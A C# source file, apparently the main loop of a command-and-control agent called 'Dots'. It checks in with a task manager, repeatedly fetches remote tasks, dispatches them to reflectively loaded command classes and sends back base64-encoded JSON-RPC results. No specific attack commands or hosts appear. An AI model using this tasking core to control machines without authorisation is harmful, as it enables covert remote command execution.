using Dots.Models;
using System;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Dots
{
    public class Program
    {
        private static TaskManager _taskManager;
        private static CancellationTokenSource _tokenSource;
        private static readonly DotsProperties _dotsProperty = new DotsProperties();

        public static void Main(string[] args)
        {
            LoadDotsCommands();
            _taskManager = new TaskManager(args[0]);
            _taskManager.Init();
            _taskManager.InitialCheckin(args[1]);
            _taskManager.Start(_dotsProperty);
            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {
                if(_taskManager.RetrieveBatchRequest(out var tasks))
                {
                    foreach (var task in tasks)
                    {
                        ExecuteTask(task);
                    }
                }
            }
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }

        private static void LoadDotsCommands()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();

            foreach (var type in assembly.GetTypes())
            {
                if (type.IsSubclassOf(typeof(DotsCommand)))
                {
                    DotsCommand command = (DotsCommand) Activator.CreateInstance(type);
                    command.DotsProperty = _dotsProperty;
                    _dotsProperty.Commands.Add(command);
                }
            }
        }

        private static void ExecuteTask(TaskRequest task)
        {
            foreach (Object command in _dotsProperty.Commands)
            {
                try
                {
                    Type commandType = command.GetType();

                    PropertyInfo nameProperty = commandType.GetProperty("Name");
                    if (nameProperty == null || nameProperty.PropertyType != typeof(string))
                    {
                        // The command object does not have a valid "Name" property
                        continue;
                    }

                    MethodInfo executeMethod = commandType.GetMethod("Execute");
                    if (executeMethod == null)
                    {
                        // The command object does not have a valid "Execute" property
                        continue;
                    }

                    string name = (string)nameProperty.GetValue(command);

                    if (name == task.Method)
                    {
                        object result = executeMethod.Invoke(command, new object[] { task.Params });
                        if (result is byte[] bytes)
                        {
                            result = Convert.ToBase64String(bytes);
                        }
                        else if (result != null)
                        {
                            result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result.ToString()));
                        } else
                        {
                            result = "";
                        }
                        TaskResult Result = new TaskResult
                        {
                            JSONRPC = task.JSONRPC,
                            Result = (string)result,
                            Id = task.Id
                        };
                        _taskManager.SendResult(Result);
                        return;
                    }

                }
                catch (Exception ex)
                {

                    TaskError failedToExecuteError = new TaskError
                    {
                        JSONRPC = "2.0",
                        Error = new TaskErrorDetails
                        {
                            Code = -32000,
                            Message = Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.ToString())),
                        },
                        Id = task.Id
                    };
                    _taskManager.SendError(failedToExecuteError);
                    return;
                }
            }

            TaskError methodNotSupportedError = new TaskError
            {
                JSONRPC = task.JSONRPC,
                Error = new TaskErrorDetails
                {
                    Code = -32601,
                    Message = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{task.Method} is not supported")),
                },
                Id = task.Id,
            };
            _taskManager.SendError(methodNotSupportedError);
        }
    }
}
